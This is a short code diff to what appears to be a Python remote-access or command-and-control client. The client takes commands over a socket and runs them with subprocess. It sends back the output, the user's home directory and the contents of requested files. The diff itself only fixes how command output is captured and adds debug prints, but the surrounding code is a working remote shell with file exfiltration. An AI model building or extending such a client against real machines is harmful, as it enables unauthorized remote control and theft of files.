@@ -18,7 +18,7 @@ def main():
             if 'cmd' in command:
                 del command[0]
                 print(command)
-                output = subprocess.run(command, stdout=subprocess.PIPE)
+                output = subprocess.run(command, stdout=subprocess.PIPE).stdout
             elif 'Arsenal' in command:
                 s.send(b'Client initial checkin\n')
                 s.send(bytes("Homedir: " + os.environ.get('HOME'), "utf-8"))
@@ -29,9 +29,11 @@ def main():
                 with open(command[1]) as f:
                     fs.sendall(bytes(f.read()))
             elif 'sendbuf' in command:
-                s.send(bytes(len(output.stdout)))
+                print(command, output)
+                s.send(bytes(len(output)))
             elif 'ack' in command:
-                s.sendall(bytes(output.stdout))
+                print(command, output)
+                s.sendall(bytes(output))
         except OSError as err:
             print("{0}\n".format(err))
 
